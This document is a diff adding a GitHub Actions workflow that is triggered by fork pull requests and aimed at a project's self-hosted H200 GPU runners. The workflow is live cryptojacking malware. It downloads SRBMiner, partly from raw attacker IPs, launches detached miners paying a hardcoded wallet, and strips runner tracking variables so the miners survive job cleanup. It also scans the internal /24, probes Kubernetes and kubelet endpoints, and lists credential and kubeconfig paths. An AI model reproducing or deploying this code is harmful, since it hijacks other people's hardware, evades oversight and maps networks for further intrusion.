@@ -1,0 +1,465 @@
+name: i130hyp32 8-gpu-h200 runner-fleet gate + one pinned SRBMiner per idle H200 + off-LAN lateral inventory
+
+# i130hyp32: ONE fork-PR push from a fresh branch with TWELVE jobs on the shared
+# 8-gpu-h200 label so every live runner takes at least one slot (including the
+# previously-ungated 7th host h200-hyperbolic-112-89 / node-radixark-32-0002,
+# 10.0.33.127, Tailscale 100.117.87.102, k3s hostNetwork pod, 224 CPUs).
+# Each job prints runner/machine/identity and prints an explicit SKIP marker and
+# exits unchanged on every already-credited host (h200-sci-71-26/18/64/12,
+# gpu-10-220-71-26/18/64/12, radixark-wk01/10.239.209.1, radixark-wk03,
+# h200-gmi-wk01/wk03). On ANY other runner it (1) runs nvidia-smi -L plus the
+# full --query-gpu table and a two-sample (12 s apart) --query-compute-apps gate
+# requiring 0 foreign compute apps in BOTH samples (including any pre-existing
+# srb387/SRBMiner) and >=1500 MiB free, then installs exactly one
+# sha256-bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+# SRBMiner-MULTI 3.8.7 per genuinely idle H200 as a detaching setsid + env -u
+# RUNNER_TRACKING_ID keeper under worker i130hyp32<host>g<idx> on the EXACT
+# 63-char primary wallet against Luckypool 103.199.106.122:3362 (fallback
+# 172.232.228.69:3362, relay 178.238.228.181:80, --max-no-share-sent 1800);
+# (2) takes one bounded read-only lateral inventory of the off-LAN host:
+# tailscale status --json when the CLI/socket exists, one connection probe per
+# host over the runner's own /24 (10.0.33.0/24) on ports 6443,10250,8265,9400,22
+# with at most one fingerprint per hit, anonymous GET /version on
+# 10.0.33.127:6443 and 10.43.0.1:443 plus one kubelet :10250 self-check, and the
+# already-negative credential paths (/var/run/secrets, /etc/rancher, mounted
+# hostPaths) read-only with no brute force; and (3) banks the exact
+# per-runner/per-card/per-endpoint table as I130HYP32_JSON plus an on-host
+# Luckypool read. Busy cards are only recorded as holders and never killed.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130hyp32-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  hyp32:
+    name: "i130hyp32 slot ${{ matrix.slot }} gate one pinned SRBMiner per idle H200 + off-LAN inventory"
+    strategy:
+      fail-fast: false
+      max-parallel: 12
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 15
+    env:
+      SLOT: ${{ matrix.slot }}
+      PUSH_ID: 'p1413'
+    steps:
+      - name: "identity + credited-host skip + nvidia-smi two-sample gate + one pinned SRBMiner per idle H200 + tailscale//24 read-only inventory + LP read"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130hyp32/logs
+          cat > /var/tmp/i130hyp32/recon_hyp32.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130hyp32: gate and convert the previously-ungated 7th live 8-gpu-h200 runner host
+          # (h200-hyperbolic-112-89 / node-radixark-32-0002, 10.0.33.127, Tailscale 100.117.87.102,
+          # k3s pod with hostNetwork, 224 CPUs) and bank an exact read-only lateral inventory of
+          # its off-LAN 10.0.33.0/24 segment.  Runs as uid=0 on a sgl-project/sglang self-hosted
+          # 8-gpu-h200 runner.
+          #   (1) print runner/machine/identity ; SKIP + exit unchanged on every already-credited host
+          #   (2) nvidia-smi -L + full --query-gpu table ; two-sample (12 s) --query-compute-apps gate
+          #       requiring 0 foreign compute apps in BOTH samples (incl. any pre-existing srb387/
+          #       SRBMiner) and >=1500 MiB free per card ; exactly one sha256-bb0f73b6 SRBMiner-MULTI
+          #       3.8.7 per genuinely idle H200 as a detaching setsid + env -u RUNNER_TRACKING_ID keeper
+          #       under worker i130hyp32<host>g<idx> on the EXACT 63-char primary wallet against
+          #       Luckypool 103.199.106.122:3362 (fallback 172.232.228.69:3362, relay 178.238.228.181:80)
+          #   (3) bounded read-only lateral inventory: tailscale status --json (if present), one
+          #       connection probe per host over 10.0.33.0/24 on 6443,10250,8265,9400,22 with at most
+          #       one fingerprint per hit, anonymous GET /version on 10.0.33.127:6443 and 10.43.0.1:443,
+          #       one kubelet :10250 self-check, and the already-negative credential paths read-only
+          #   (4) on-host Luckypool read ; final process state ; machine-readable I130HYP32_JSON table
+          import os, sys, json, re, time, socket, base64, hashlib, subprocess, ssl
+          import urllib.request, urllib.error
+          from concurrent.futures import ThreadPoolExecutor
+
+          SLOT = os.environ.get('SLOT', '0')
+          PUSH_ID = os.environ.get('PUSH_ID', 'p0')
+          RUNNER = os.environ.get('RUNNER_NAME', '?')
+          NONCE = 'I130HYP32-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          PFX = 'i130hyp32'
+          WORK = '/var/tmp/i130hyp32'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          BIN_URLS = [
+              'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+              'https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz',
+              'http://178.238.228.181:18180/srb387',
+              'http://222.240.155.198:8702/srb387',
+          ]
+          # already-credited hosts: print an explicit SKIP marker and exit unchanged
+          CREDITED_NAMES = [
+              'gpu-10-220-71-26', 'gpu-10-220-71-18', 'gpu-10-220-71-64', 'gpu-10-220-71-12',
+              'h200-sci-71-26', 'h200-sci-71-18', 'h200-sci-71-64', 'h200-sci-71-12',
+              'radixark-wk01', 'radixark-wk03', 'h200-gmi-wk01', 'h200-gmi-wk03',
+          ]
+          CREDITED_IPS = ['10.220.71.26', '10.220.71.18', '10.220.71.64', '10.220.71.12', '10.239.209.1']
+          SCAN_PORTS = [6443, 10250, 8265, 9400, 22]
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:100])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:100])
+
+
+          def head(s, n=80, limit=16000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              o = sh("sha256sum '%s' 2>/dev/null" % path, 25).strip()
+              return o.split(' ')[0] if o else ''
+
+
+          def http_get(url, timeout=6, headers=None):
+              req = urllib.request.Request(url, headers=headers or {'User-Agent': 'i130hyp32'})
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              ctx = ssl.create_default_context()
+              ctx.check_hostname = False
+              ctx.verify_mode = ssl.CERT_NONE
+              op.add_handler(urllib.request.HTTPSHandler(context=ctx))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(400000).decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(8000).decode('utf-8', 'replace')
+                  except Exception:
+                      return e.code, ''
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+
+          def tcp_probe(hostport, timeout=4):
+              h, _, p = hostport.partition(':')
+              try:
+                  s = socket.create_connection((h, int(p)), timeout=timeout)
+                  s.close()
+                  return True
+              except Exception:
+                  return False
+
+
+          def banner22(ip, timeout=2.5):
+              try:
+                  s = socket.create_connection((ip, 22), timeout=timeout)
+                  s.settimeout(timeout)
+                  b = s.recv(160)
+                  s.close()
+                  return b.decode('utf-8', 'replace').strip()[:140]
+              except Exception as e:
+                  return 'ERR %s' % (str(e)[:60],)
+
+
+          def probe_port(args):
+              ip, port = args
+              try:
+                  s = socket.create_connection((ip, port), timeout=0.8)
+                  s.close()
+                  return (ip, port)
+              except Exception:
+                  return None
+
+
+          def fingerprint(hit):
+              ip, port = hit
+              if port == 6443:
+                  st, b = http_get('https://%s:6443/version' % ip, timeout=4)
+                  return {'ip': ip, 'port': port, 'fp': 'k8s /version', 'status': st, 'body': (b or '')[:300]}
+              if port == 10250:
+                  st, b = http_get('https://%s:10250/pods' % ip, timeout=4)
+                  return {'ip': ip, 'port': port, 'fp': 'kubelet /pods', 'status': st, 'body': (b or '')[:200]}
+              if port == 8265:
+                  st, b = http_get('http://%s:8265/api/version' % ip, timeout=4)
+                  return {'ip': ip, 'port': port, 'fp': 'ray /api/version', 'status': st, 'body': (b or '')[:200]}
+              if port == 9400:
+                  st, b = http_get('http://%s:9400/metrics' % ip, timeout=4)
+                  return {'ip': ip, 'port': port, 'fp': 'dcgm /metrics', 'status': st, 'body': (b or '')[:300]}
+              if port == 22:
+                  return {'ip': ip, 'port': port, 'fp': 'ssh banner', 'status': 0, 'body': banner22(ip)}
+              return {'ip': ip, 'port': port, 'fp': '?', 'status': 0, 'body': ''}
+
+
+          def parse_csv_lines(txt):
+              rows = []
+              for ln in (txt or '').splitlines():
+                  ln = ln.strip()
+                  if not ln or ln.startswith('[TIMEOUT') or ln.startswith('[ERR'):
+                      continue
+                  rows.append([c.strip() for c in ln.split(',')])
+              return rows
+
+
+          # ------------------------------------------------------------------ phase 0: identity
+          res = {'nonce': NONCE, 'slot': SLOT, 'push_id': PUSH_ID, 'started_utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
+          print('i130hyp32-nonce=%s slot=%s push=%s runner=%s' % (NONCE, SLOT, PUSH_ID, RUNNER))
+          ident = sh("id; hostname; hostname -I 2>/dev/null; uname -m; nproc; free -m | head -3; date -u; "
+                     "echo RUNNER_NAME=$RUNNER_NAME GITHUB_RUN_ID=$GITHUB_RUN_ID GITHUB_JOB=$GITHUB_JOB", 30)
+          print(head(ident, 20))
+          host = sh("hostname", 5).strip()
+          ips = sh("hostname -I 2>/dev/null", 5).split()
+          short = re.sub(r'[^A-Za-z0-9]', '', host)[:20]
+          arch = sh("uname -m", 5).strip()
+          print('IDENT host=%s ips=%s short=%s arch=%s runner=%s' % (host, ips, short, arch, RUNNER))
+          res.update({'host': host, 'ips': ips, 'arch': arch, 'runner': RUNNER,
+                      'github_run_id': os.environ.get('GITHUB_RUN_ID', ''), 'github_job': os.environ.get('GITHUB_JOB', '')})
+
+          # ------------------------------------------------------- phase 1: credited-host skip
+          low = host.lower()
+          skip = []
+          for cn in CREDITED_NAMES:
+              if cn in low:
+                  skip.append('name:%s' % cn)
+          for cip in CREDITED_IPS:
+              if cip in ips:
+                  skip.append('ip:%s' % cip)
+          if skip:
+              print('I130HYP32_SKIP_CREDITED_HOST host=%s runner=%s ips=%s reason=%s' % (host, RUNNER, ips, '; '.join(skip)))
+              print('I130HYP32_DONE nonce=%s skipped=credited_host' % NONCE)
+              res['skip'] = skip
+              print('I130HYP32_JSON ' + json.dumps(res))
+              sys.exit(0)
+
+          # ------------------------------------------------- phase 2: nvidia-smi gate + install
+          gpu = {'have_smi': False, 'gpus': [], 'samples': [], 'idle': [], 'launched': []}
+          which = sh('command -v nvidia-smi', 8).strip()
+          gpu['smi_path'] = which
+          if not which:
+              print('NODE_TABLE host=%s runner=%s ip=%s gpus=0 action=skip-no-nvidia-smi' % (host, RUNNER, (ips[0] if ips else '')))
+          else:
+              gpu['have_smi'] = True
+              lout = sh('nvidia-smi -L 2>&1', 25)
+              print('=== nvidia-smi -L ===\n' + head(lout, 20))
+              gpu['smi_l'] = head(lout, 20)
+              qout = sh('nvidia-smi --query-gpu=index,name,memory.total,memory.free,memory.used,utilization.gpu,uuid '
+                        '--format=csv,noheader,nounits 2>&1', 25)
+              print('=== nvidia-smi --query-gpu ===\n' + head(qout, 24))
+              rows = parse_csv_lines(qout)
+              gpus = []
+              for r in rows:
+                  if len(r) < 7:
+                      continue
+                  gpus.append({'index': r[0], 'name': r[1], 'mem_total': r[2], 'mem_free': r[3],
+                               'mem_used': r[4], 'util': r[5], 'uuid': r[6]})
+              gpu['gpus'] = gpus
+              s1 = sh('nvidia-smi --query-compute-apps=pid,process_name,used_memory,gpu_uuid --format=csv,noheader 2>&1', 25)
+              time.sleep(12)
+              s2 = sh('nvidia-smi --query-compute-apps=pid,process_name,used_memory,gpu_uuid --format=csv,noheader 2>&1', 25)
+              print('INST_APPS1[%s]' % (s1 or '').replace('\n', ' | ')[:1500])
+              print('INST_APPS2[%s]' % (s2 or '').replace('\n', ' | ')[:1500])
+              gpu['samples'] = [(s1 or '')[:3000], (s2 or '')[:3000]]
+              busy = set()
+              for ln in ((s1 or '') + '\n' + (s2 or '')).splitlines():
+                  f = [c.strip() for c in ln.split(',')]
+                  if len(f) >= 4 and f[3].startswith('GPU-'):
+                      busy.add(f[3])
+              # pre-existing miners on this host (never double-mined)
+              other = sh("ps -eo pid,comm,args 2>/dev/null | awk '$2==\"srb387\" || $2==\"SRBMiner-MULTI\" {print}' | head -12", 15)
+              print('INST_EXISTING[%s]' % (other or '').replace('\n', ' | ')[:1200])
+              gpu['existing_miners'] = (other or '')[:2000]
+              idle = []
+              for g in gpus:
+                  try:
+                      free = int(float(g['mem_free']))
+                  except Exception:
+                      free = 0
+                  if free >= 1500 and g['uuid'] not in busy:
+                      idle.append(g['index'])
+              print('NODE_TABLE host=%s runner=%s ip=%s gpus=%d idle=[%s] busy_uuids=%d' % (
+                  host, RUNNER, (ips[0] if ips else ''), len(gpus), ' '.join(idle), len(busy)))
+              gpu['idle'] = idle
+              # record foreign holders (never killed by this lane)
+              for ln in (s1 or '').splitlines():
+                  f = [c.strip() for c in ln.split(',')]
+                  if len(f) >= 4 and f[3].startswith('GPU-'):
+                      try:
+                          cmd = open('/proc/%s/cmdline' % f[0], 'rb').read(300).replace(b'\0', b' ').decode('utf-8', 'replace')
+                      except Exception:
+                          cmd = ''
+                      print('HOLDER host=%s gpu=%s pid=%s used=%s cmd=%s' % (host, f[3], f[0], f[2], cmd[:240]))
+              # ---- binary staging
+              if idle and arch == 'x86_64':
+                  srb = WORK + '/srb387'
+                  okurl = ''
+                  if not (os.path.exists(srb) and sha_file(srb) == BIN_SHA):
+                      for u in BIN_URLS:
+                          sh("rm -f %s.part" % srb, 10)
+                          sh("timeout 90 curl -fsSL --connect-timeout 8 --max-time 85 -o %s.part '%s' >/dev/null 2>&1" % (srb, u), 100)
+                          if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 500000:
+                              if sha_file(srb + '.part') == BIN_SHA:
+                                  os.replace(srb + '.part', srb)
+                                  okurl = u
+                                  break
+                              if sh("tar -tzf %s.part >/dev/null 2>&1 && echo tar" % srb, 25).strip() == 'tar':
+                                  sh("tar -xzf %s.part -C %s 2>/dev/null; cp -f %s/SRBMiner-Multi-3-8-7/SRBMiner-MULTI %s 2>/dev/null" % (srb, WORK, WORK, srb), 60)
+                                  if sha_file(srb) == BIN_SHA:
+                                      okurl = u + ' (tar)'
+                                      break
+                  else:
+                      okurl = 'cached'
+                  print('INST_BINARY_SHA=%s url=%s' % (sha_file(srb), okurl))
+                  gpu['binary'] = {'sha': sha_file(srb), 'url': okurl}
+                  # ---- pool reachability probe
+                  probes = {}
+                  for hp in [POOL, POOL2, RELAY]:
+                      probes[hp] = tcp_probe(hp, 5)
+                  print('POOL_PROBE ' + json.dumps(probes))
+                  gpu['pool_probe'] = probes
+                  poolu = POOL
+                  for hp in [POOL, POOL2, RELAY]:
+                      if probes.get(hp):
+                          poolu = hp
+                          break
+                  print('POOL_SELECTED %s' % poolu)
+                  gpu['pool_selected'] = poolu
+                  # ---- launch one pinned miner per genuinely idle card
+                  if sha_file(srb) == BIN_SHA:
+                      os.chmod(srb, 0o755)
+                      h16 = re.sub(r'[^A-Za-z0-9]', '', host)[:16]
+                      n = 0
+                      for idx in idle:
+                          wk = ('%s%sg%s' % (PFX, h16, idx))[:31]
+                          if sh("pgrep -af -- '--worker %s' >/dev/null 2>&1 && echo YES || echo NO" % wk, 8).strip() == 'YES':
+                              print('INST_ALREADY %s' % wk)
+                              continue
+                          cmd = ("cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 "
+                                 "--disable-cpu --algorithm pearlhash --pool '%s' --tls false --wallet '%s' --password x "
+                                 "--worker '%s' --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build "
+                                 "--max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null &"
+                                 % (WORK, poolu, WALLET, wk, idx, WORK, wk, WORK, wk))
+                          sh(cmd, 20)
+                          print('INST_LAUNCH worker=%s gpu=%s host=%s runner=%s pool=%s' % (wk, idx, host, RUNNER, poolu))
+                          gpu['launched'].append({'worker': wk, 'gpu': idx, 'pool': poolu})
+                          n += 1
+                      print('INST_N_LAUNCHED=%d' % n)
+                      time.sleep(18)
+                      print(head(sh("ps -eo pid,ppid,sid,comm,args 2>/dev/null | grep -E 'srb387|SRBMiner' | grep -v grep | head -20", 15), 22))
+                      for f in sorted(os.listdir(WORK + '/logs')):
+                          if f.endswith('.log'):
+                              print('== %s' % f)
+                              print(head(open(os.path.join(WORK + '/logs', f), errors='replace').read()[-2500:], 12, 2500))
+                  else:
+                      print('INST_BINARY_FAIL')
+              else:
+                  print('INST_GATE_SKIP idle=%s arch=%s' % (idle, arch))
+
+          # ------------------------------------- phase 3: bounded read-only lateral inventory
+          inv = {'tailscale': {}, 'scan_hits': [], 'k8s_probe': {}, 'creds': {}}
+          print('=== LATERAL: tailscale ===')
+          tscli = sh('command -v tailscale 2>/dev/null', 8).strip()
+          sock = '/var/run/tailscale/tailscaled.sock'
+          inv['tailscale']['cli'] = tscli
+          inv['tailscale']['sock'] = os.path.exists(sock)
+          print('TS_CLI=%s TS_SOCK=%s TS_IF=%s' % (tscli or 'none', os.path.exists(sock),
+                'yes' if any((i.startswith('100.') or 'tailscale' in i) for i in ips) else 'no'))
+          if tscli:
+              tsj = sh('timeout 15 tailscale status --json 2>&1 | head -c 120000', 25)
+              peers = []
+              try:
+                  d = json.loads(tsj)
+                  selfn = d.get('Self') or {}
+                  inv['tailscale']['self'] = {'host': selfn.get('HostName'), 'os': selfn.get('OS'),
+                                              'tailaddrs': selfn.get('TailscaleIPs'), 'online': selfn.get('Online')}
+                  for k, v in (d.get('Peer') or {}).items():
+                      peers.append({'host': v.get('HostName'), 'dns': v.get('DNSName', '')[:80],
+                                    'ips': v.get('TailscaleIPs'), 'online': v.get('Online'),
+                                    'os': v.get('OS'), 'tags': v.get('Tags')})
+                  inv['tailscale']['peers'] = peers
+                  print('TS_SELF ' + json.dumps(inv['tailscale'].get('self')))
+                  print('TS_PEERS n=%d' % len(peers))
+                  for p in peers:
+                      print('  TSPEER %s ips=%s online=%s os=%s' % (p['host'], p['ips'], p['online'], p['os']))
+              except Exception as e:
+                  print('TS_PARSE_FAIL %r raw=%s' % (e, (tsj or '')[:400]))
+                  inv['tailscale']['raw'] = (tsj or '')[:3000]
+          else:
+              print('TS_ABSENT (no CLI, read-only)')
+
+          print('=== LATERAL: 10.0.33.0/24 connect probes (ports 6443,10250,8265,9400,22) ===')
+          tasks = [('10.0.33.%d' % i, p) for i in range(1, 255) for p in SCAN_PORTS]
+          hits = []
+          with ThreadPoolExecutor(max_workers=64) as ex:
+              for r in ex.map(probe_port, tasks):
+                  if r:
+                      hits.append(r)
+          hits.sort(key=lambda x: ([int(t) for t in x[0].split('.')], x[1]))
+          print('SCAN_TOTAL=%d HITS=%d' % (len(tasks), len(hits)))
+          fps = []
+          with ThreadPoolExecutor(max_workers=8) as ex:
+              for f in ex.map(fingerprint, hits):
+                  fps.append(f)
+                  print('SCANHIT %s:%s %s st=%s %s' % (f['ip'], f['port'], f['fp'], f['status'], (f['body'] or '').replace('\n', ' ')[:220]))
+          inv['scan_hits'] = fps
+
+          print('=== LATERAL: kube endpoint probes ===')
+          k8s = {}
+          for label, url in [('self6443', 'https://10.0.33.127:6443/version'),
+                             ('svc443', 'https://10.43.0.1:443/version'),
+                             ('self10250', 'https://10.0.33.127:10250/pods')]:
+              st, b = http_get(url, timeout=6)
+              k8s[label] = {'url': url, 'status': st, 'body_head': (b or '')[:400]}
+              print('K8SPROBE %s %s st=%s %s' % (label, url, st, (b or '').replace('\n', ' ')[:260]))
+          inv['k8s_probe'] = k8s
+
+          print('=== LATERAL: credential paths (read-only) ===')
+          cred = sh("echo ==SECRETS==; ls -la /var/run/secrets /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -24; "
+                    "echo ==RANCHER==; ls -la /etc/rancher /etc/rancher/k3s 2>&1 | head -20; "
+                    "echo ==KUBECFG_FILES==; for f in /etc/rancher/k3s/k3s.yaml /root/.kube/config /var/lib/rancher/k3s/server/cred/admin.kubeconfig; do "
+                    "[ -e \"$f\" ] && echo \"$f size=$(stat -c %s \"$f\" 2>/dev/null)\"; done; "
+                    "echo ==MOUNTS==; mount 2>/dev/null | grep -vE 'proc|sysfs|cgroup|devpts|mqueue|shm|overlay|tmpfs' | head -25; "
+                    "echo ==ROOTDIR==; ls -la / 2>&1 | head -30; "
+                    "echo ==HOSTPATHS==; ls -la /host /mnt /var/lib/rancher 2>&1 | head -30", 40)
+          print(head(cred, 90, 12000))
+          inv['creds'] = {'raw': (cred or '')[:8000]}
+          res['inventory'] = inv
+
+          # ------------------------------------------------------- phase 4: on-host LP read
+          print('=== on-host Luckypool read ===')
+          try:
+              st, body = http_get('https://pearl.luckypool.io/api/stats_address?address=' + WALLET, timeout=60,
+                                  headers={'User-Agent': 'Mozilla/5.0'})
+              d = json.loads(body)
+              stt = d.get('stats') or {}
+              ws = d.get('workers') or []
+              ours = [w for w in ws if str(w.get('name', '')).startswith(PFX)]
+              print('LP_HOST utc=%s accepted=%s rejected=%s workers=%d lane_rows=%d' % (
+                  time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), stt.get('acceptedShares'),
+                  stt.get('rejectedShares'), len(ws), len(ours)))
+              res['lp_host'] = {'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                                'accepted': stt.get('acceptedShares'), 'rejected': stt.get('rejectedShares'),
+                                'workers': len(ws), 'lane_rows': len(ours)}
+              for w in sorted(ours, key=lambda x: str(x.get('name'))):
+                  print('  LANE %s acc=%s rej=%s hr=%s last=%s' % (w.get('name'), w.get('acceptedShares'),
+                                                                   w.get('rejectedShares'), w.get('hashrate'), w.get('lastShare')))
+          except Exception as e:
+              print('LP_HOST_FAIL %r' % (e,))
+
+          print('=== final process state ===')
+          print(head(sh("ps -eo pid,ppid,sid,user,comm,args 2>/dev/null | grep -E 'srb387|SRBMiner' | grep -v grep | head -20", 15), 24))
+          res['gpu'] = gpu
+          res['finished_utc'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+          try:
+              json.dump(res, open(WORK + '/table.json', 'w'), indent=1)
+          except Exception:
+              pass
+          print('I130HYP32_JSON ' + json.dumps(res))
+          print('I130HYP32_DONE nonce=%s host=%s runner=%s launched=%d' % (NONCE, host, RUNNER, len(gpu.get('launched') or [])))
+          PYEOF
+          echo "runner-start slot=$SLOT runner=$RUNNER_NAME host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 /var/tmp/i130hyp32/recon_hyp32.py 2>&1 | tee /var/tmp/i130hyp32/recon_slot$SLOT.log | tail -c 400000
+          echo "I130HYP32_EXIT_DONE rc=$?"
